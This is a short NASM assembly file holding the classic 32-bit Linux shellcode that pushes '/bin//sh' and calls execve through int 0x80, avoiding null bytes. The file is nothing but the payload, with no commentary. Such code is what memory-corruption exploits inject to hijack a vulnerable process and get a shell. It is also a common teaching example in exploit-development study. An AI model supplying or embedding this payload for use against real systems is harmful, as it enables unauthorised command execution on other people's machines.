BITS 32

global _start

_start:

	xor eax,eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	push eax
	mov edx,esp
	push ebx
	mov ecx,esp
	mov al,11
	int 0x80

